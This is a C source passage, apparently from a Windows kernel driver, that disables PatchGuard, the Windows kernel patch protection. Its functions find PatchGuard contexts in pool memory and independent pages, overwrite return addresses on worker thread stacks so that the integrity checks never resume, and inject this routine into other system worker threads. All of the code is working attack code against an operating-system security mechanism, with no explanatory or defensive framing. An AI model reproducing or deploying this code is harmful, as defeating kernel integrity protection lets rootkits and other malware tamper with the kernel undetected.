PgSetDecodeEntry(
    __in PVOID Context
)
{
    ULONG64 LowLimit = 0;
    ULONG64 HighLimit = 0;
    PULONG64 InitialStack = 0;
    PULONG64 TargetPc = NULL;
    ULONG Count = 0;
    PCALLERS Callers = NULL;
    PVOID ControlPc = NULL;

    Callers = ExAllocatePool(
        NonPagedPool,
        MAX_STACK_DEPTH * sizeof(CALLERS));

    if (NULL != Callers) {
        Count = WalkFrameChain(
            Callers,
            MAX_STACK_DEPTH);

        if (0 != Count) {
            IoGetStackLimits(&LowLimit, &HighLimit);

            InitialStack = IoGetInitialStack();

            // all worker thread start at KiStartSystemThread and return address == 0
            // if null != last return address code is in noimage

            if (NULL != Callers[Count - 1].Establisher) {
                DbgPrint(
                    "Soul - Testis - < %p > found noimage return address in worker\n",
                    Callers[Count - 1].Establisher);

                // scan pg entry code in region

                ControlPc = FindBigPoolPgEntrySig(Callers[Count - 1].Establisher);

                if (NULL != ControlPc) {
                    DbgPrint(
                        "Soul - Testis - < %p > found pg entry sig in bigpool\n",
                        ControlPc);

                    for (TargetPc = (PULONG64)Callers[Count - 1].EstablisherFrame;
                        (ULONG64)TargetPc < (ULONG64)InitialStack;
                        TargetPc++) {
                        // In most cases, PatchGuard code will wait for a random time.
                        // set return address in current thread stack to _RevertWorkerThreadToSelf
                        // than PatchGuard code was not continue

                        if ((ULONG64)*TargetPc == (ULONG64)Callers[Count - 1].Establisher) {
                            // restart ExpWorkerThread

                            // ExFrame->P1Home = (ULONG64)NtosExpWorkerContext;
                            // ExFrame->P2Home = (ULONG64)NtosExpWorkerThread;
                            // ExFrame->P3Home = (ULONG64)NtosPspSystemThreadStartup;
                            // ExFrame->Return = (ULONG64)NtosKiStartSystemThread; <- jmp function return address == 0

                            *TargetPc = (ULONG64)_RevertWorkerThreadToSelf;

                            DbgPrint(
                                "Soul - Testis - revert worker thread to self\n");

                            break;
                        }
                    }
                }
                else {
                    // independent pages length is not easy to determine
                    // and MmAllocateIndependentPages not export
                    // so check address in independent pages region

                    if (FALSE != IsIndependentPages(Callers[Count - 1].Establisher)) {
                        DbgPrint(
                            "Soul - Testis - < %p > return address in independent pages\n",
                            Callers[Count - 1].Establisher);

                        for (TargetPc = (PULONG64)Callers[Count - 1].EstablisherFrame;
                            (ULONG64)TargetPc < (ULONG64)InitialStack;
                            TargetPc++) {
                            if ((ULONG64)*TargetPc == (ULONG64)Callers[Count - 1].Establisher) {
                                *TargetPc = (ULONG64)_RevertWorkerThreadToSelf;

                                DbgPrint(
                                    "Soul - Testis - revert worker thread to self\n");

                                break;
                            }
                        }
                    }
                }
            }
        }

        ExFreePool(Callers);
    }
}

VOID
NTAPI
PgClearWorker(
    __in PKEVENT Notify
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    PSYSTEM_PROCESS_INFORMATION ProcessInfo = NULL;
    PSYSTEM_EXTENDED_THREAD_INFORMATION ThreadInfo = NULL;
    PVOID Buffer = NULL;
    ULONG BufferSize = PAGE_SIZE;
    ULONG ReturnLength = 0;
    ULONG Index = 0;
    PULONG64 InitialStack = 0;
    PKPRIQUEUE WorkPriQueue = NULL;

    // if os build < 9600 NtosExpWorkerContext = (0 or 1) 
    // else NtosExpWorkerContext = struct _KPRIQUEUE 
    //      (0x15 == WorkPriQueue->Header.Type && 
    //      0xac == WorkPriQueue->Header.Hand)

    InitialStack = IoGetInitialStack();
    NtosExpWorkerContext = UlongToPtr(CriticalWorkQueue);

    while ((ULONG64)InitialStack != (ULONG64)&Notify) {
        WorkPriQueue = *(PVOID *)InitialStack;

        if (FALSE != MmIsAddressValid(WorkPriQueue)) {
            if (FALSE != MmIsAddressValid((PCHAR)(WorkPriQueue + 1) - 1)) {
                if (0x15 == WorkPriQueue->Header.Type &&
                    0xac == WorkPriQueue->Header.Hand) {
                    NtosExpWorkerContext = WorkPriQueue;
                    break;
                }
            }
        }

        InitialStack--;
    }

    PgClearPagesContext();
    PgClearBigPoolContext();

retry:
    Buffer = ExAllocatePool(
        NonPagedPool,
        BufferSize);

    if (NULL != Buffer) {
        RtlZeroMemory(
            Buffer,
            BufferSize);

        Status = ZwQuerySystemInformation(
            SystemExtendedProcessInformation,
            Buffer,
            BufferSize,
            &ReturnLength);

        if (Status >= 0) {
            ProcessInfo = (PSYSTEM_PROCESS_INFORMATION)Buffer;

            while (TRUE) {
                if (PsGetCurrentProcessId() == ProcessInfo->UniqueProcessId) {
                    ThreadInfo = (PSYSTEM_EXTENDED_THREAD_INFORMATION)
                        (ProcessInfo + 1);

                    if (NULL == NtosExpWorkerThread) {
                        for (Index = 0;
                            Index < ProcessInfo->NumberOfThreads;
                            Index++) {
                            if ((ULONG64)PsGetCurrentThreadId() ==
                                (ULONG64)ThreadInfo[Index].ThreadInfo.ClientId.UniqueThread) {
                                NtosExpWorkerThread = ThreadInfo[Index].Win32StartAddress;

                                break;
                            }
                        }
                    }

                    if (NULL != NtosExpWorkerThread) {
                        for (Index = 0;
                            Index < ProcessInfo->NumberOfThreads;
                            Index++) {
                            if ((ULONG64)PsGetCurrentThreadId() !=
                                (ULONG64)ThreadInfo[Index].ThreadInfo.ClientId.UniqueThread &&
                                (ULONG64)NtosExpWorkerThread ==
                                (ULONG64)ThreadInfo[Index].Win32StartAddress) {
                                RemoteCall(
                                    ThreadInfo[Index].ThreadInfo.ClientId.UniqueThread,
                                    IMAGE_NT_OPTIONAL_HDR_MAGIC,
                                    (PUSER_THREAD_START_ROUTINE)PgSetDecodeEntry,
                                    NULL);
                            }
                        }
                    }

                    break;
                }

                if (0 == ProcessInfo->NextEntryOffset) {
                    break;
                }
                else {
                    ProcessInfo = (PSYSTEM_PROCESS_INFORMATION)
                        ((PCHAR)ProcessInfo + ProcessInfo->NextEntryOffset);
                }
            }
        }

        ExFreePool(Buffer);
        Buffer = NULL;

        if (STATUS_INFO_LENGTH_MISMATCH == Status) {
            BufferSize = ReturnLength;
            goto retry;
        }
    }

    KeSetEvent(
        Notify,
        LOW_PRIORITY,
        FALSE);
}

VOID
NTAPI
DisPg(
    VOID
)
{
    KEVENT Notify = { 0 };

    // after PatchGuard logic is interrupted not trigger again.
    // so no need to continue running.

    if (0 == PgEntryRvaOffset ||
        0 == PgAppendSectionSize ||
        0 == PgNtSectionSize) {
        SetPgContextField();
    }

    if (NULL == PoolBigPageTable ||
        0 == PoolBigPageTableSize ||
        NULL == LargePoolTableLock) {
        FindPoolBigPageTable();
    }

    if (0 != PgEntryRvaOffset &&
        0 != PgAppendSectionSize &&
        NULL != PgAppendSection &&
        0 != PgNtSectionSize &&
        NULL != PoolBigPageTable &&
        0 != PoolBigPageTableSize &&
        NULL != LargePoolTableLock&&
        NULL != NtosMmDeterminePoolType) {
        KeInitializeEvent(
            &Notify,
            SynchronizationEvent,
            FALSE);

        ExInitializeWorkItem(
            &PgClearWorkerItem,
            PgClearWorker,
            &Notify);

        ExQueueWorkItem(
            &PgClearWorkerItem,
            CriticalWorkQueue);

        KeWaitForSingleObject(
            &Notify,
            Executive,
            KernelMode,
            FALSE,
            NULL);
    }
}
